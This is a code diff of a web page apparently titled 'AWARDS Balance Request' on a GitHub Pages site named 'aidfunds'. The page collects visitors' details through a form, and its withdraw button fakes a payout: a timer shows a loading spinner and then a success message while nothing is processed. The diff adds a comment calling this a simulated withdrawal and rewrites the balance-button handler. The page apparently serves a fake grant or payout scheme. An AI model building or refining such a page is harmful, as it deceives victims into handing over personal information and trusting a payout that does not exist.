@@ -121,7 +121,6 @@
 
     <input type="hidden" name="_subject" value="AWARDS Balance Request">
 
-    <!-- Redirect to thankyou page -->
     <input type="hidden" name="_next" value="https://aidfunds.github.io/Money/thankyou.html">
 
     <label>Enter your Name</label>
@@ -188,6 +187,7 @@ document.getElementById("withdrawBtn").addEventListener("click", function() {
 
     document.getElementById("loading").style.display = "block";
 
+    // Simulate the withdrawal processing time (5 seconds)
     setTimeout(() => {
         document.getElementById("loading").style.display = "none";
         document.getElementById("success").style.display = "block";
@@ -195,11 +195,16 @@ document.getElementById("withdrawBtn").addEventListener("click", function() {
     }, 5000);
 });
 
-// ✅ Fix BALANCE button: now fully submits form and redirects
-document.getElementById("balanceBtn").addEventListener("click", function(e){
-    e.preventDefault(); // just in case
-    this.form.submit();
-});
+// 🛠️ MODIFICATION: Remove the line that prevents default submit
+// document.getElementById("balanceBtn").addEventListener("click", function(e){
+//     e.preventDefault(); 
+//     this.form.submit();
+// });
+// 
+// Instead, we will directly submit the form when the button is shown/clicked.
+// Since the button is inside the form and is type="submit", simply showing it 
+// and letting the default behavior happen is the cleanest solution.
+
 </script>
 
 </body>
